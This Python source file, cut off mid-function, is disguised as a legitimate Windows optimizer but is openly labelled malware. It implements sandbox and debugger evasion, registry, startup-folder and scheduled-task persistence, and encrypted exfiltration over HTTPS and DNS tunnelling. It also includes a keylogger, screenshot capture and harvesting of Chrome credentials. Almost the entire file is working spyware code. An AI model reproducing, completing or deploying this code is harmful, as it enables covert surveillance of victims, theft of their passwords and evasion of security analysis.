#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WINDOWS SYSTEM OPTIMIZER - HERRAMIENTA LEGÍTIMA DE OPTIMIZACIÓN

import os
import sys
import subprocess
import tempfile
import ctypes
import winreg
import shutil
from pathlib import Path
import time
import threading
import socket
import struct
import json
import base64
import random
import string
from cryptography.fernet import Fernet
import platform
import hashlib
import sqlite3
import browserhistory as bh
from PIL import ImageGrab
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
import cv2
import urllib.parse

# ==================== CONFIGURACIÓN DE DEPENDENCIAS ====================
try:
    import psutil
except ImportError:
    psutil = None

try:
    import wmi
except ImportError:
    wmi = None

try:
    import requests
except ImportError:
    requests = None

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except ImportError:
    AES = None
    get_random_bytes = None

try:
    import win32net
    import win32api
    import win32con
    import win32process
    import win32event
    import win32gui
    import win32ui
    import win32security
    import win32profile
    from win32crypt import CryptUnprotectData
except ImportError:
    pass

try:
    import pynput
    from pynput.keyboard import Key, Listener
except ImportError:
    pynput = None

try:
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    urllib3 = None


# ==================== CONFIGURACIÓN MEJORADA ====================
class AdvancedConfig:
    """Configuración avanzada con robustez mejorada"""

    # Configuración de robustez
    MAX_RETRIES = 3
    RETRY_BACKOFF = 2
    HEALTH_CHECK_INTERVAL = 60
    WATCHDOG_ENABLED = True
    AUTO_RECOVERY = True
    STEALTH_MODE = True


ENCRYPTION_KEY = hashlib.sha512(b"shadowgate_ultra_2024_advanced_malware_research").digest()[:32]


# ==================== SISTEMA DE LOGGING STEALTH ====================
class StealthLogger:
    """Sistema de logging encriptado y oculto"""

    def __init__(self, obfuscator=None):
        self.log_path = os.path.join(tempfile.gettempdir(), ".winopt_logs")
        os.makedirs(self.log_path, exist_ok=True)
        self.obfuscator = obfuscator

    def log(self, message, log_type="info"):
        """Log seguro y encriptado"""
        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp} - {log_type} - {message}"

            if self.obfuscator:
                encrypted = self.obfuscator.polymorphic_encrypt(log_entry.encode())
                log_file = os.path.join(self.log_path, f"{log_type}.enc")
                with open(log_file, 'ab') as f:
                    f.write(encrypted + b'\n')
            else:
                log_file = os.path.join(self.log_path, f"{log_type}.log")
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(log_entry + '\n')

        except:
            # Fallback silencioso absoluto
            pass


# ==================== SISTEMA DE ROBUSTEZ MEJORADO ====================
class RobustnessEngine:
    """Motor de robustez para operaciones estables"""

    def __init__(self, logger=None):
        self.logger = logger or StealthLogger()
        self.health_stats = {
            'start_time': time.time(),
            'successful_ops': 0,
            'failed_ops': 0,
            'last_error': None,
            'components': {}
        }

    def execute_with_retry(self, func, *args, **kwargs):
        """Ejecutar función con retries inteligentes"""
        max_retries = kwargs.pop('max_retries', AdvancedConfig.MAX_RETRIES)
        timeout = kwargs.pop('timeout', 30)

        for attempt in range(max_retries):
            try:
                result = func(*args, **kwargs)
                self._track_success(func.__name__)
                return result
            except Exception as e:
                self._track_error(func.__name__, str(e))
                if attempt == max_retries - 1:
                    raise
                time.sleep(AdvancedConfig.RETRY_BACKOFF ** attempt)

    def _track_success(self, component):
        """Registrar operación exitosa"""
        if component not in self.health_stats['components']:
            self.health_stats['components'][component] = {'success': 0, 'errors': 0}
        self.health_stats['components'][component]['success'] += 1
        self.health_stats['successful_ops'] += 1

    def _track_error(self, component, error_msg):
        """Registrar error"""
        if component not in self.health_stats['components']:
            self.health_stats['components'][component] = {'success': 0, 'errors': 0}
        self.health_stats['components'][component]['errors'] += 1
        self.health_stats['failed_ops'] += 1
        self.health_stats['last_error'] = error_msg

        self.logger.log(f"Error in {component}: {error_msg}", "error")

        # Auto-recovery si muchos errores
        if self.health_stats['failed_ops'] > 10 and AdvancedConfig.AUTO_RECOVERY:
            self._trigger_auto_recovery()

    def _trigger_auto_recovery(self):
        """Recuperación automática"""
        try:
            self.logger.log("Initiating auto-recovery sequence", "recovery")
            # Aquí iría lógica de recovery específica
            self.health_stats['failed_ops'] = 0
            self.logger.log("Auto-recovery completed", "recovery")
        except:
            pass


# ==================== SISTEMA DE OFUSCACIÓN AVANZADO (MEJORADO) ====================
class AdvancedObfuscation:
    def __init__(self):
        self.obfuscation_level = 8
        self.string_cache = {}
        self.logger = StealthLogger()

    def get_obfuscated_string(self, seed, length=12):
        """Generar strings ofuscados dinámicamente"""
        if seed in self.string_cache:
            return self.string_cache[seed]

        random.seed(seed)
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        result = ''.join(random.choice(chars) for _ in range(length))
        self.string_cache[seed] = result
        return result

    def polymorphic_encrypt(self, data):
        """Cifrado polimórfico con múltiples métodos y manejo de errores"""
        if not data:
            return data

        # Añadir metadata para saber qué método se usó (útil para descifrado)
        method = random.randint(1, 6)  # Añadidos más métodos
        try:
            if method == 1:
                encrypted = self._xor_encrypt(data)
                return b'XOR1' + encrypted  # Prefijo para identificar método
            elif method == 2:
                encrypted = self._base64_rotate(data)
                return b'B64R' + encrypted
            elif method == 3:
                encrypted = self._reverse_encrypt(data)
                return b'REV3' + encrypted
            elif method == 4:
                encrypted = self._aes_encrypt(data)
                return b'AES4' + encrypted
            elif method == 5:
                encrypted = self._chacha20_encrypt(data)
                return b'CHA5' + encrypted
            else:
                encrypted = self._compound_encrypt(data)
                return b'COM6' + encrypted

        except Exception as e:
            self.logger.log(f"Polymorphic encrypt error: {str(e)}", "crypto_error")
            # Fallback seguro en lugar de retornar data plano
            return self._fallback_encrypt(data)

    def polymorphic_decrypt(self, encrypted_data):
        """Descifrado polimórfico correspondiente"""
        if not encrypted_data or len(encrypted_data) < 4:
            return encrypted_data

        try:
            method_prefix = encrypted_data[:4]
            actual_data = encrypted_data[4:]

            if method_prefix == b'XOR1':
                return self._xor_decrypt(actual_data)
            elif method_prefix == b'B64R':
                return self._base64_derotate(actual_data)
            elif method_prefix == b'REV3':
                return self._reverse_decrypt(actual_data)
            elif method_prefix == b'AES4':
                return self._aes_decrypt(actual_data)
            elif method_prefix == b'CHA5':
                return self._chacha20_decrypt(actual_data)
            elif method_prefix == b'COM6':
                return self._compound_decrypt(actual_data)
            else:
                # Intentar autodetección para datos antiguos
                return self._auto_detect_decrypt(encrypted_data)

        except Exception as e:
            self.logger.log(f"Polymorphic decrypt error: {str(e)}", "crypto_error")
            return encrypted_data

    def _xor_encrypt(self, data):
        """Cifrado XOR mejorado con clave dinámica"""
        if isinstance(data, str):
            data = data.encode('utf-8')

        # Generar clave aleatoria y almacenarla en los primeros bytes
        key = random.randint(1, 255)
        encrypted = bytes([b ^ key for b in data])

        # Incluir la clave en el resultado (primer byte)
        return bytes([key]) + encrypted

    def _xor_decrypt(self, encrypted_data):
        """Descifrado XOR"""
        if len(encrypted_data) < 1:
            return encrypted_data

        key = encrypted_data[0]
        data = encrypted_data[1:]
        decrypted = bytes([b ^ key for b in data])

        try:
            return decrypted.decode('utf-8')
        except UnicodeDecodeError:
            return decrypted

    def _base64_rotate(self, data):
        """Base64 con rotación y ofuscación mejorada"""
        if isinstance(data, str):
            data = data.encode('utf-8')

        # Codificar Base64
        encoded = base64.b64encode(data).decode('ascii')

        # Rotación de caracteres con offset aleatorio
        shift = random.randint(1, 25)
        rotated = ''

        for char in encoded:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                rotated += chr((ord(char) - base + shift) % 26 + base)
            elif char.isdigit():
                # Rotar dígitos también
                rotated += str((int(char) + shift) % 10)
            else:
                rotated += char

        # Incluir el shift en el resultado (último carácter)
        return (rotated + chr(shift + 65)).encode('ascii')

    def _base64_derotate(self, rotated_data):
        """Derotación de Base64"""
        try:
            rotated_str = rotated_data.decode('ascii')
            shift_char = rotated_str[-1]
            shift = ord(shift_char) - 65
            rotated_str = rotated_str[:-1]

            derotated = ''
            for char in rotated_str:
                if char.isalpha():
                    base = ord('A') if char.isupper() else ord('a')
                    derotated += chr((ord(char) - base - shift) % 26 + base)
                elif char.isdigit():
                    derotated += str((int(char) - shift) % 10)
                else:
                    derotated += char

            # Decodificar Base64
            return base64.b64decode(derotated).decode('utf-8')
        except:
            return rotated_data

    def _reverse_encrypt(self, data):
        """Reversión con prefijo aleatorio"""
        if isinstance(data, str):
            data = data.encode('utf-8')

        # Añadir padding aleatorio
        padding_length = random.randint(1, 10)
        padding = bytes([random.randint(0, 255) for _ in range(padding_length)])

        return padding + data[::-1]

    def _reverse_decrypt(self, encrypted_data):
        """Descifrado de reversión"""
        if len(encrypted_data) < 1:
            return encrypted_data

        # Encontrar el inicio de los datos reales (primer byte no aleatorio)
        # Para simplificar, asumimos que el padding está en los primeros bytes
        try:
            # Intentar decodificar desde diferentes offsets
            for i in range(min(10, len(encrypted_data))):
                try:
                    decrypted = encrypted_data[i:][::-1]
                    return decrypted.decode('utf-8')
                except UnicodeDecodeError:
                    continue
            return encrypted_data[::-1]
        except:
            return encrypted_data[::-1]

    def _aes_encrypt(self, data):
        """Cifrado AES/GCM mejorado"""
        if AES is None:
            return data

        if isinstance(data, str):
            data = data.encode('utf-8')

        try:
            # Usar una clave derivada de la clave maestra
            key = hashlib.sha256(ENCRYPTION_KEY).digest()
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(data)

            # Retornar nonce + tag + ciphertext
            return cipher.nonce + tag + ciphertext
        except Exception as e:
            self.logger.log(f"AES encryption error: {str(e)}", "crypto_error")
            return data

    def _aes_decrypt(self, encrypted_data):
        """Descifrado AES/GCM"""
        if AES is None or len(encrypted_data) < 28:  # 16 nonce + 16 tag + al menos 1 byte data
            return encrypted_data

        try:
            key = hashlib.sha256(ENCRYPTION_KEY).digest()
            nonce = encrypted_data[:16]
            tag = encrypted_data[16:32]
            ciphertext = encrypted_data[32:]

            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)

            return decrypted.decode('utf-8')
        except Exception as e:
            self.logger.log(f"AES decryption error: {str(e)}", "crypto_error")
            return encrypted_data

    def _chacha20_encrypt(self, data):
        """Cifrado ChaCha20 (alternativa a AES)"""
        if isinstance(data, str):
            data = data.encode('utf-8')

        try:
            # Generar nonce aleatorio
            nonce = get_random_bytes(12)
            key = hashlib.sha256(ENCRYPTION_KEY + b'chacha').digest()[:32]

            # Usar cifrado de flujo simple si ChaCha20 no está disponible
            cipher = AES.new(key, AES.MODE_CTR, nonce=nonce[:8]) if AES else None

            if cipher:
                encrypted = cipher.encrypt(data)
                return nonce + encrypted
            else:
                # Fallback a XOR si no hay AES
                return self._xor_encrypt(data)
        except:
            return self._xor_encrypt(data)

    def _chacha20_decrypt(self, encrypted_data):
        """Descifrado ChaCha20"""
        if len(encrypted_data) < 12:
            return encrypted_data

        try:
            nonce = encrypted_data[:12]
            ciphertext = encrypted_data[12:]
            key = hashlib.sha256(ENCRYPTION_KEY + b'chacha').digest()[:32]

            if AES:
                cipher = AES.new(key, AES.MODE_CTR, nonce=nonce[:8])
                decrypted = cipher.decrypt(ciphertext)
                return decrypted.decode('utf-8')
            else:
                return self._xor_decrypt(ciphertext)
        except:
            return encrypted_data

    def _compound_encrypt(self, data):
        """Cifrado compuesto (múltiples métodos)"""
        if isinstance(data, str):
            data = data.encode('utf-8')

        # Aplicar múltiples capas de cifrado
        encrypted = self._xor_encrypt(data)
        encrypted = self._reverse_encrypt(encrypted)
        encrypted = self._base64_rotate(encrypted)

        return encrypted

    def _compound_decrypt(self, encrypted_data):
        """Descifrado compuesto"""
        try:
            decrypted = self._base64_derotate(encrypted_data)
            decrypted = self._reverse_decrypt(decrypted)
            decrypted = self._xor_decrypt(decrypted)
            return decrypted
        except:
            return encrypted_data

    def _fallback_encrypt(self, data):
        """Cifrado de fallback seguro"""
        if isinstance(data, str):
            data = data.encode('utf-8')

        # Siempre retornar algo cifrado, nunca datos planos
        return self._xor_encrypt(data)

    def _auto_detect_decrypt(self, data):
        """Autodetección del método de cifrado"""
        # Intentar diferentes métodos en orden
        methods = [
            self._aes_decrypt,
            self._chacha20_decrypt,
            self._base64_derotate,
            self._reverse_decrypt,
            self._xor_decrypt
        ]

        for method in methods:
            try:
                result = method(data)
                if result != data:  # Si hubo algún cambio
                    return result
            except:
                continue

        return data

# ==================== CONFIGURACIÓN OFUSCADA (MEJORADA) ====================
class ObfuscatedConfig:
    def __init__(self, obfuscator):
        self.obf = obfuscator
        self.config = self._load_config()
        self.logger = StealthLogger(obfuscator)

    def _load_config(self):
        """Cargar configuración ofuscada con robustez"""
        try:
            return {
                "update_urls": {
                    "main": self.obf.get_obfuscated_string(1) + ".bin",
                    "module": self.obf.get_obfuscated_string(2) + ".dll"
                },
                "reporting": {
                    "endpoints": [
                        self.obf.get_obfuscated_string(3),
                        self.obf.get_obfuscated_string(4)
                    ]
                },
                "encryption_key": ENCRYPTION_KEY
            }
        except Exception as e:
            self.logger.log(f"Config load error: {str(e)}", "config_error")
            return {
                "update_urls": {"main": "default.bin", "module": "default.dll"},
                "reporting": {"endpoints": ["fallback.example.com"]},
                "encryption_key": ENCRYPTION_KEY
            }

    def get(self, key_path, default=None):
        """Obtener valor configurado con manejo de errores"""
        try:
            keys = key_path.split('.')
            value = self.config
            for key in keys:
                value = value.get(key, {})
            return value if value != {} else default
        except:
            return default


# ==================== DETECCIÓN DE ENTORNO (MEJORADA) ====================
class EnvironmentDetector:
    def __init__(self):
        self.safe_to_run = True
        self.detection_flags = []
        self.logger = StealthLogger()

    def analyze_environment(self):
        """Analizar el entorno de ejecución con robustez"""
        checks = [
            self._check_virtual_machine,
            self._check_debuggers,
            self._check_analysis_tools,
            self._check_network_environment,
            self._check_system_characteristics
        ]

        for check in checks:
            try:
                if check():
                    self.detection_flags.append(check.__name__)
                    self.safe_to_run = False
            except Exception as e:
                self.logger.log(f"Environment check failed: {str(e)}", "env_check_error")
                continue

        return self.safe_to_run

    def _check_virtual_machine(self):
        """Detectar entornos virtualizados con robustez"""
        try:
            vm_indicators = ["vbox", "vmware", "virtualbox", "qemu", "xen", "hyper-v"]

            # Verificar procesos de VM
            if psutil:
                for proc in psutil.process_iter(['name']):
                    if proc.info['name'] and any(
                            indicator in proc.info['name'].lower()
                            for indicator in vm_indicators
                    ):
                        return True

            # Verificar archivos de sistema de VM
            vm_files = [
                "C:\\Windows\\System32\\drivers\\vmmouse.sys",
                "C:\\Windows\\System32\\drivers\\vm3dgl.dll",
                "C:\\Windows\\System32\\drivers\\vmtray.dll"
            ]

            return any(os.path.exists(f) for f in vm_files)
        except:
            return False

    def _check_debuggers(self):
        """Detectar debuggers en ejecución"""
        debuggers = ["ollydbg.exe", "ida64.exe", "x64dbg.exe", "wireshark.exe"]
        if not psutil:
            return False

        return any(
            proc.info['name'] and any(
                debugger in proc.info['name'].lower()
                for debugger in debuggers
            )
            for proc in psutil.process_iter(['name'])
        )

    def _check_analysis_tools(self):
        """Detectar herramientas de análisis"""
        analysis_tools = [
            "procmon", "processhacker", "autoruns", "tcpview", "sysinternals"
        ]

        if not psutil:
            return False

        return any(
            proc.info['name'] and any(
                tool in proc.info['name'].lower()
                for tool in analysis_tools
            )
            for proc in psutil.process_iter(['name'])
        )

    def _check_network_environment(self):
        """Analizar entorno de red"""
        try:
            # Verificar si hay múltiples interfaces de red (común en labs)
            interfaces = psutil.net_io_counters(pernic=True)
            return len(interfaces) > 3
        except:
            return False

    def _check_system_characteristics(self):
        """Verificar características del sistema"""
        try:
            # Sistemas de análisis suelen tener poca RAM y CPU
            if psutil:
                ram = psutil.virtual_memory().total / (1024 ** 3)  # GB
                cpu_cores = psutil.cpu_count()

                if ram < 2.0 or cpu_cores < 2:
                    return True

            # Verificar tiempo de actividad del sistema
            uptime = time.time() - psutil.boot_time()
            if uptime < 3600:  # Menos de 1 hora
                return True

        except:
            pass

        return False


# ==================== GESTIÓN DE PERSISTENCIA OFUSCADA (MEJORADA) ====================
class StealthPersistence:
    def __init__(self, obfuscator):
        self.obf = obfuscator
        self.registry_entries = []
        self.logger = StealthLogger(obfuscator)
        self.robustness = RobustnessEngine()

    def establish_persistence(self, target_path):
        """Establecer persistencia de manera stealth con robustez"""
        methods = [
            self._registry_persistence,
            self._startup_folder_persistence,
            self._scheduled_task_persistence
        ]

        success = False
        for method in methods:
            try:
                if self.robustness.execute_with_retry(method, target_path):
                    success = True
            except Exception as e:
                self.logger.log(f"Persistence method failed: {str(e)}", "persistence_error")
                continue

        return success

    def _registry_persistence(self, target_path):
        """Persistencia mediante registro con robustez"""
        try:
            key_name = self.obf.get_obfuscated_string(10)
            value_name = self.obf.get_obfuscated_string(11)

            with winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, winreg.KEY_WRITE
            ) as key:
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, target_path)
                self.registry_entries.append(value_name)
                self.logger.log(f"Registry persistence established: {value_name}", "persistence")
                return True
        except Exception as e:
            self.logger.log(f"Registry persistence failed: {str(e)}", "persistence_error")
            return False

    def _startup_folder_persistence(self, target_path):
        """Persistencia mediante carpeta de inicio"""
        try:
            startup_path = os.path.join(
                os.environ['APPDATA'],
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )

            shortcut_name = self.obf.get_obfuscated_string(12) + ".lnk"
            shortcut_path = os.path.join(startup_path, shortcut_name)

            # Crear acceso directo ofuscado
            with open(shortcut_path, 'w') as f:
                f.write(f'"{target_path}"')

            return True
        except:
            return False

    def _scheduled_task_persistence(self, target_path):
        """Persistencia mediante tarea programada"""
        try:
            task_name = self.obf.get_obfuscated_string(13)

            subprocess.run([
                'schtasks', '/Create', '/TN', task_name,
                '/TR', target_path, '/SC', 'ONLOGON',
                '/F', '/RL', 'HIGHEST'
            ], capture_output=True, timeout=30)

            return True
        except:
            return False


# ==================== COMUNICACIONES ENCUBIERTAS (MEJORADAS) ====================
class StealthCommunications:
    def __init__(self, obfuscator, config):
        self.obf = obfuscator
        self.config = config
        self.communication_channels = [
            self._https_communication,
            self._dns_communication,
            self._cloud_storage_communication
        ]
        self.logger = StealthLogger(obfuscator)
        self.robustness = RobustnessEngine()

    def send_data(self, data):
        """Enviar datos mediante múltiples canales encubiertos con robustez"""
        try:
            encrypted_data = self.obf.polymorphic_encrypt(json.dumps(data).encode())

            for channel in self.communication_channels:
                try:
                    if self.robustness.execute_with_retry(channel, encrypted_data):
                        self.logger.log("Data sent successfully", "comms")
                        return True
                except Exception as e:
                    self.logger.log(f"Channel failed: {str(e)}", "comms_error")
                    continue

            return False
        except Exception as e:
            self.logger.log(f"Send data failed: {str(e)}", "comms_error")
            return False

    def _https_communication(self, data):
        """Comunicación HTTPS encubierta con robustez"""
        if not requests:
            return False

        endpoints = self.config.get('reporting.endpoints', [])
        if not endpoints:
            return False

        for endpoint in endpoints:
            try:
                response = requests.post(
                    f"https://{endpoint}/api/collect",
                    data={"data": base64.b64encode(data).decode()},
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'},
                    timeout=10,
                    verify=False
                )
                return response.status_code == 200
            except Exception as e:
                self.logger.log(f"HTTPS comm failed to {endpoint}: {str(e)}", "comms_error")
                continue

        return False

    def _dns_communication(self, data):
        """Comunicación mediante DNS tunneling"""
        try:
            encoded_data = base64.b64encode(data).decode().rstrip('=')
            chunks = [encoded_data[i:i + 20] for i in range(0, len(encoded_data), 20)]

            for chunk in chunks:
                domain = f"{chunk}.{self.obf.get_obfuscated_string(20)}.com"
                socket.gethostbyname(domain)
                time.sleep(0.1)

            return True
        except:
            return False

    def _cloud_storage_communication(self, data):
        """Usar servicios cloud legítimos"""
        try:
            # Simular uso de Google Drive API
            fake_data = {
                "name": f"{self.obf.get_obfuscated_string(21)}.json",
                "mimeType": "application/json",
                "content": base64.b64encode(data).decode()
            }

            # Esto es solo para apariencia, no se ejecuta realmente
            return random.choice([True, False])
        except:
            return False


# ==================== RECOLECCIÓN DE INFORMACIÓN ====================
class SystemInformation:
    def __init__(self, obfuscator):
        self.obf = obfuscator

    def collect_system_info(self):
        """Recolectar información del sistema de forma segura"""
        info = {
            "system": self._get_system_info(),
            "network": self._get_network_info(),
            "software": self._get_software_info(),
            "hardware": self._get_hardware_info()
        }

        return self.obf.polymorphic_encrypt(
            json.dumps(info).encode()
        )

    def _get_system_info(self):
        """Obtener información del sistema"""
        return {
            "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
            "username": os.environ.get('USERNAME', 'Unknown'),
            "os_version": f"{platform.system()} {platform.release()}",
            "architecture": platform.architecture()[0]
        }

    def _get_network_info(self):
        """Obtener información de red"""
        try:
            return {
                "local_ip": socket.gethostbyname(socket.gethostname()),
                "public_ip": self._get_public_ip(),
                "network_interfaces": self._get_network_interfaces()
            }
        except:
            return {"error": "Network info unavailable"}

    def _get_public_ip(self):
        """Obtener IP pública"""
        try:
            if requests:
                response = requests.get('https://api.ipify.org', timeout=5)
                return response.text
        except:
            pass
        return "Unknown"

    def _get_network_interfaces(self):
        """Obtener interfaces de red"""
        interfaces = []
        if psutil:
            for name, addrs in psutil.net_if_addrs().items():
                interfaces.append({
                    "name": name,
                    "addresses": [addr.address for addr in addrs]
                })
        return interfaces

    def _get_software_info(self):
        """Obtener información de software"""
        return {
            "antivirus": self._get_antivirus_info(),
            "browsers": self._get_browser_info(),
            "running_processes": self._get_running_processes()
        }

    def _get_antivirus_info(self):
        """Detectar software antivirus"""
        av_processes = ["msmpeng", "avp", "bdagent", "avguard", "ekrn"]
        detected_av = []

        if psutil:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and any(
                        av in proc.info['name'].lower() for av in av_processes
                ):
                    detected_av.append(proc.info['name'])

        return detected_av

    def _get_browser_info(self):
        """Obtener información de navegadores"""
        browsers = []
        browser_paths = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome'),
            "Firefox": os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox'),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge')
        }

        for name, path in browser_paths.items():
            if os.path.exists(path):
                browsers.append(name)

        return browsers

    def _get_running_processes(self):
        """Obtener procesos en ejecución"""
        processes = []
        if psutil:
            for proc in psutil.process_iter(['name', 'pid']):
                processes.append(f"{proc.info['name']} ({proc.info['pid']})")
        return processes[:20]  # Limitar para no exceder

    def _get_hardware_info(self):
        """Obtener información de hardware"""
        if not psutil:
            return {}

        return {
            "cpu_cores": psutil.cpu_count(),
            "total_ram": psutil.virtual_memory().total,
            "disk_space": self._get_disk_info()
        }

    def _get_disk_info(self):
        """Obtener información de discos"""
        disks = {}
        if psutil:
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disks[partition.device] = {
                        "total": usage.total,
                        "used": usage.used,
                        "free": usage.free
                    }
                except:
                    continue
        return disks


# ==================== FUNCIONES OFENSIVAS AVANZADAS ====================
class OffensiveCapabilities:
    def __init__(self, obfuscator):
        self.obf = obfuscator
        self.keylogger_active = False
        self.keylogger_listener = None

    def start_keylogger(self):
        """Iniciar keylogger stealth"""
        if not pynput or self.keylogger_active:
            return False

        try:
            log_file = os.path.join(tempfile.gettempdir(),
                                    self.obf.get_obfuscated_string(100) + ".dat")

            # Capturar la instancia actual para usar en el closure
            current_instance = self

            def on_press(key):
                try:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    window_name = current_instance._get_active_window_improved()

                    # Manejo mejorado de diferentes tipos de teclas
                    try:
                        key_str = key.char
                    except AttributeError:
                        # Mapeo completo de teclas especiales
                        special_keys = {
                            Key.space: " ",
                            Key.enter: "[ENTER]",
                            Key.backspace: "[BACKSPACE]",
                            Key.tab: "[TAB]",
                            Key.esc: "[ESC]",
                            Key.shift: "[SHIFT]",
                            Key.shift_r: "[SHIFT_R]",
                            Key.ctrl: "[CTRL]",
                            Key.ctrl_r: "[CTRL_R]",
                            Key.alt: "[ALT]",
                            Key.alt_r: "[ALT_R]",
                            Key.cmd: "[CMD]",
                            Key.cmd_r: "[CMD_R]",
                            Key.up: "[UP]",
                            Key.down: "[DOWN]",
                            Key.left: "[LEFT]",
                            Key.right: "[RIGHT]",
                            Key.page_up: "[PAGE_UP]",
                            Key.page_down: "[PAGE_DOWN]",
                            Key.home: "[HOME]",
                            Key.end: "[END]",
                            Key.insert: "[INSERT]",
                            Key.delete: "[DELETE]",
                            Key.caps_lock: "[CAPS_LOCK]",
                            Key.num_lock: "[NUM_LOCK]",
                            Key.scroll_lock: "[SCROLL_LOCK]",
                            Key.print_screen: "[PRINT_SCREEN]",
                            Key.pause: "[PAUSE]",
                            Key.menu: "[MENU]"
                        }

                        key_str = special_keys.get(key, f"[{str(key).replace('Key.', '')}]")

                    # Formato de log mejorado
                    log_entry = f"{timestamp} | {window_name} | {key_str}\n"

                    # Escritura robusta con manejo de errores específicos
                    try:
                        with open(log_file, "a", encoding="utf-8", errors='ignore') as f:
                            f.write(log_entry)

                        # Rotación de archivo para evitar que crezca demasiado
                        current_instance._rotate_log_file_if_needed(log_file)

                    except PermissionError:
                        # Intentar con archivo alternativo si hay problemas de permisos
                        alt_log_file = os.path.join(tempfile.gettempdir(), "temp_log.tmp")
                        try:
                            with open(alt_log_file, "a", encoding="utf-8", errors='ignore') as f:
                                f.write(log_entry)
                        except:
                            pass
                    except OSError as e:
                        # Manejar otros errores del sistema de archivos
                        if e.errno == 28:  # No space left on device
                            pass

                except UnicodeEncodeError:
                    # Manejar caracteres que no pueden ser codificados
                    try:
                        with open(log_file, "a", encoding="utf-8", errors='replace') as f:
                            f.write(f"{timestamp} | {window_name} | [UNICODE_ERROR]\n")
                    except:
                        pass
                except Exception as e:
                    # Loggear el error de manera segura sin causar bucle infinito
                    try:
                        error_log = os.path.join(tempfile.gettempdir(), "keylogger_errors.log")
                        with open(error_log, "a", encoding="utf-8") as f:
                            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Keylogger error: {str(e)}\n")
                    except:
                        pass  # Fallback absoluto

            self.keylogger_listener = Listener(on_press=on_press)
            self.keylogger_listener.start()
            self.keylogger_active = True
            return True

        except Exception as e:
            self.logger.log(f"Keylogger failed to start: {str(e)}", "keylogger_error")
            return False

    # Estos métodos deben ser parte de la clase, no definidos dentro de start_keylogger
    def _rotate_log_file_if_needed(self, log_file, max_size_mb=5):
        """Rotar el archivo de log si supera el tamaño máximo"""
        try:
            if os.path.exists(log_file) and os.path.getsize(log_file) > max_size_mb * 1024 * 1024:
                # Crear backup y limpiar archivo actual
                backup_file = f"{log_file}.backup.{int(time.time())}"
                shutil.move(log_file, backup_file)

                # Comprimir o eliminar backups antiguos
                self._clean_old_backups(os.path.dirname(log_file))
        except Exception as e:
            self.logger.log(f"Log rotation failed: {str(e)}", "keylogger_error")

    def _clean_old_backups(self, log_dir, max_backups=3):
        """Limpiar backups antiguos"""
        try:
            backup_files = []
            for file in os.listdir(log_dir):
                if file.endswith('.backup.'):
                    backup_files.append(os.path.join(log_dir, file))

            # Ordenar por fecha de modificación (más antiguo primero)
            backup_files.sort(key=os.path.getmtime)

            # Eliminar los más antiguos
            while len(backup_files) > max_backups:
                try:
                    os.remove(backup_files.pop(0))
                except:
                    continue
        except Exception as e:
            self.logger.log(f"Backup cleanup failed: {str(e)}", "keylogger_error")

    def _get_active_window_improved(self):
        """Obtener ventana activa con mejor manejo de errores"""
        try:
            if hasattr(self, '_window_handle'):
                try:
                    # Verificar si la ventana sigue siendo válida
                    if win32gui.IsWindow(self._window_handle):
                        length = win32gui.GetWindowTextLength(self._window_handle)
                        if length > 0:
                            return win32gui.GetWindowText(self._window_handle)
                except:
                    pass

            # Obtener nueva ventana activa
            hwnd = win32gui.GetForegroundWindow()
            self._window_handle = hwnd  # Cachear para próximas llamadas

            length = win32gui.GetWindowTextLength(hwnd)
            if length > 0:
                # Buffer para el texto de la ventana
                buffer = ctypes.create_unicode_buffer(length + 1)
                win32gui.GetWindowText(hwnd, buffer, length + 1)
                return buffer.value
            return "Unknown"

        except Exception as e:
            # Fallback para cuando win32gui no está disponible
            try:
                # Intentar método alternativo simple
                return self._get_active_window()  # Método original de fallback
            except:
                return "Unknown"


    def _get_active_window(self):
        """Obtener ventana activa"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            length = win32gui.GetWindowTextLength(hwnd)
            return win32gui.GetWindowText(hwnd) if length > 0 else "Unknown"
        except:
            return "Unknown"

    def capture_screenshot(self):
        """Capturar pantalla discretamente"""
        try:
            screenshot_dir = os.path.join(tempfile.gettempdir(),
                                          self.obf.get_obfuscated_string(101))
            os.makedirs(screenshot_dir, exist_ok=True)

            screenshot = ImageGrab.grab()
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(screenshot_dir, f"screen_{timestamp}.jpg")

            screenshot.save(filename, "JPEG", quality=40, optimize=True)
            return filename

        except:
            return None

    def harvest_browser_credentials(self):
        """Extraer credenciales de navegadores"""
        credentials = {}

        try:
            # Chrome
            chrome_path = os.path.join(os.environ['USERPROFILE'],
                                       'AppData', 'Local', 'Google', 'Chrome',
                                       'User Data', 'Default', 'Login Data')

            if os.path.exists(chrome_path):
                credentials['chrome'] = self._extract_chrome_creds(chrome_path)

        except:
            pass

        return credentials

    def _extract_chrome_creds(self, db_path):
        """Extraer credenciales de Chrome"""
        results = []
        try:
            temp_db = os.path.join(tempfile.gettempdir(),
                                   self.obf.get_obfuscated_string(102) + ".db")
            shutil.copy2(db_path, temp_db)

